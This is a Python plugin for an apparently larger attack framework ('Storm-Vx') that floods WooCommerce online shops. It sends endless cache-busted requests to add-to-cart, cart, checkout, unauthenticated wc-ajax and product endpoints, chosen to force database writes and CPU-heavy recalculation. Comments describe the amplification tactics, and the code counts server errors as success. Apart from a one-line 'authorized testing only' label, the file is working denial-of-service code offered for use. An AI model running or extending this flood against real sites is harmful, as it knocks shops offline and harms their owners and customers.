#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_wp_woocommerce_flood — WooCommerce Flood Attack Plugin

WooCommerce adds the heaviest endpoints to WordPress:
- /?add-to-cart=<id> → INSERT INTO wp_woocommerce_sessions (DB WRITE!)
- /cart/ → Full cart recalculation (CPU + DB)
- /checkout/ → Coupon validation + shipping calc + tax (very heavy)
- /?wc-ajax=get_refreshed_fragments → No auth, CPU-heavy cart fragments
- /product/<slug>/ → Related products query (complex JOINs)
- /?filter_* → Product filtering (WP Query with meta queries)

Key insight: DB WRITES are much heavier than reads. add-to-cart
triggers an INSERT + UPDATE on every request, which is significantly
more expensive than a SELECT query.

Amplification: ~3x per request (DB writes + CPU calculations)

Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import time
import random
from typing import Dict, Any, List
from urllib.parse import urlencode, quote

import aiohttp

from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin, ResponseClass
from vf_common import rand_str, rand_cache_bust

from logging_config import get_logger
logger = get_logger(__name__)


__all__ = ["WpWooCommerceFloodPlugin"]


# WooCommerce AJAX actions (no authentication required)
_WC_AJAX_ACTIONS: List[str] = [
    "get_refreshed_fragments",  # Cart fragments (CPU-heavy)
    "apply_coupon",             # Coupon validation (DB query)
    "remove_coupon",            # Coupon removal (DB write)
    "update_shipping_method",   # Shipping recalculation
    "update_order_review",      # Order review (very heavy)
    "checkout",                 # Checkout processing (heaviest!)
    "get_cart_totals",          # Cart total calculation
    "shipping_methods",         # Shipping method query
    "add_to_cart",              # Add to cart (DB write)
    "get_product_data",         # Product data query
]


class WpWooCommerceFloodPlugin(AttackPlugin):
    """WooCommerce flood — DB writes and CPU-heavy cart operations.

    WooCommerce-specific endpoints that generate maximum server load:
    1. add-to-cart: DB WRITE to sessions table (INSERT + UPDATE)
    2. Cart page: Full price recalculation with taxes + shipping
    3. AJAX fragments: CPU-heavy cart fragment generation
    4. Checkout: Coupon validation + shipping calculation + tax

    DB writes are 5-10x heavier than reads due to:
    - Transaction overhead
    - Index updates
    - Lock contention
    - Replication lag (if any)
    """

    meta = PluginMeta(
        name='wp_woocommerce_flood',
        version='1.0.0',
        plugin_type='attack',
        description='WooCommerce flood — DB writes + cart calculations (3x amplification)',
        tags=['http', 'wordpress', 'woocommerce', 'db-burn', 'amplification'],
        priority=24,
        compatible_profiles=[],
        requirements=['aiohttp'],
    )

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """WooCommerce flood worker: DB writes + CPU-heavy operations."""
        _ssl = context.ssl_param
        site_root = context.site_root
        delay_ms = context.extra.delay_ms

        # Attack modes for variety
        modes = [
            "add_to_cart",     # DB WRITE (heaviest)
            "cart",            # Price recalculation
            "checkout",        # Coupon + shipping + tax
            "wc_ajax",         # WooCommerce AJAX
            "product",         # Related products query
        ]

        while not self._stop_event.is_set():
            try:
                mode = random.choice(modes)
                payload = None  # BUG-FIX v34: Initialize to prevent NameError on POST paths

                if mode == "add_to_cart":
                    # DB WRITE: add-to-cart triggers INSERT INTO sessions
                    product_id = random.randint(1, 99999)
                    url = f"{site_root}/?add-to-cart={product_id}"
                    url += f"&{rand_cache_bust()}"
                    headers = self._get_fresh_headers(context, "document")
                    method = "GET"

                elif mode == "cart":
                    # Cart page = full price recalculation
                    url = f"{site_root}/cart/?{rand_cache_bust()}"
                    headers = self._get_fresh_headers(context, "document")
                    method = "GET"

                elif mode == "checkout":
                    # Checkout page = coupon + shipping + tax calculation
                    url = f"{site_root}/checkout/?{rand_cache_bust()}"
                    headers = self._get_fresh_headers(context, "document")
                    method = "GET"

                elif mode == "wc_ajax":
                    # WooCommerce AJAX — no auth required
                    action = random.choice(_WC_AJAX_ACTIONS)
                    ajax_url = f"{site_root}/?wc-ajax={action}"
                    ajax_url += f"&{rand_cache_bust()}"
                    headers = self._get_fresh_headers(context, "api")
                    headers["X-Requested-With"] = "XMLHttpRequest"

                    if action in ("apply_coupon",):
                        headers["Content-Type"] = "application/x-www-form-urlencoded"
                        payload = urlencode({"coupon_code": rand_str(6).upper()})
                        method = "POST"
                        url = ajax_url
                    elif action in ("add_to_cart",):
                        headers["Content-Type"] = "application/x-www-form-urlencoded"
                        payload = urlencode({
                            "product_id": str(random.randint(1, 9999)),
                            "quantity": str(random.randint(1, 5)),
                        })
                        method = "POST"
                        url = ajax_url
                    else:
                        method = "GET"
                        url = ajax_url
                        payload = None

                elif mode == "product":
                    # Product page = related products query (complex JOIN)
                    slug = rand_str(random.randint(3, 8))
                    url = f"{site_root}/product/{slug}/?{rand_cache_bust()}"
                    headers = self._get_fresh_headers(context, "document")
                    method = "GET"
                    payload = None
                else:
                    continue

                t = time.monotonic()
                try:
                    if method == "POST" and payload:
                        async with context.session.post(
                            url, headers=headers, data=payload,
                            ssl=_ssl, allow_redirects=False,
                        ) as resp:
                            rt = time.monotonic() - t
                            resp_headers = dict(resp.headers)
                            response_class = self._process_response(
                                resp.status, resp_headers,
                                url=url[:60], worker_id=worker_id
                            )
                            # WooCommerce: 200 (success), 302 (redirect=cart),
                            # 404 (no product=still hit WP), 500 (DB error=load!)
                            # BUG-FIX v35: NOT_FOUND counts as ok because
                            # WordPress still processed the request even when
                            # WooCommerce pages/products don't exist
                            ok = response_class in (
                                ResponseClass.OK, ResponseClass.AUTH_REQUIRED,
                                ResponseClass.SERVER_ERROR, ResponseClass.REDIRECT,
                                ResponseClass.NOT_FOUND
                            )
                            self._capture_response_cookies(resp, context)
                            await self._record(
                                "WP-WC", ok, resp.status, rt,
                                url=url[:60], hint=mode,
                            )
                    else:
                        async with context.session.get(
                            url, headers=headers,
                            ssl=_ssl, allow_redirects=False,
                        ) as resp:
                            rt = time.monotonic() - t
                            resp_headers = dict(resp.headers)
                            response_class = self._process_response(
                                resp.status, resp_headers,
                                url=url[:60], worker_id=worker_id
                            )
                            # WooCommerce: 200 (success), 302 (redirect=cart),
                            # 404 (no product=still hit WP), 500 (DB error=load!)
                            # BUG-FIX v35: NOT_FOUND counts as ok because
                            # WordPress still processed the request even when
                            # WooCommerce pages/products don't exist
                            ok = response_class in (
                                ResponseClass.OK, ResponseClass.AUTH_REQUIRED,
                                ResponseClass.SERVER_ERROR, ResponseClass.REDIRECT,
                                ResponseClass.NOT_FOUND
                            )
                            self._capture_response_cookies(resp, context)
                            await self._record(
                                "WP-WC", ok, resp.status, rt,
                                url=url[:60], hint=mode,
                            )
                except asyncio.CancelledError:
                    raise
                except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                    rt = time.monotonic() - t
                    self._on_request_result(worker_id, False)
                    await self._record(
                        "WP-WC", False, 0, rt,
                        err=type(exc).__name__, url=url[:60],
                        hint=mode,
                    )

                # Adaptive sleep
                await self._adaptive_sleep(worker_id, delay_ms)

            except asyncio.CancelledError:
                return
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                self._on_request_result(worker_id, False)
                await self._record("WP-WC", False, 0, 0, err=type(exc).__name__)
                await asyncio.sleep(0.1)
